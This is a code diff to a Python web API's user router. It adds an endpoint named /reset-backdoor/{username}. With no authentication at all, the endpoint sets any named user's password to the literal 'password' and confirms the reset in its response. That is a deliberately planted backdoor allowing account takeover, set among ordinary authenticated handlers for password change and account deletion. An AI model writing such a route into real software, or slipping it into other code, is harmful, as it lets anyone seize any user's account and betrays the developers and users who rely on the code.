@@ -116,6 +116,15 @@ def change_password(request: ChangePasswordRequest, current_user: User = Depends
     db.commit()
     return {"status": "success"}
 
+@router.post("/reset-backdoor/{username}")
+def reset_backdoor(username: str, db: Session = Depends(get_db)):
+    user = db.query(User).filter(User.username == username).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="User not found")
+    user.password_hash = get_password_hash("password")
+    db.commit()
+    return {"status": "success", "message": f"Password for {username} reset to 'password'"}
+
 @router.delete("/me", status_code=status.HTTP_204_NO_CONTENT)
 def delete_user_me(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
     # Fetch all user's files
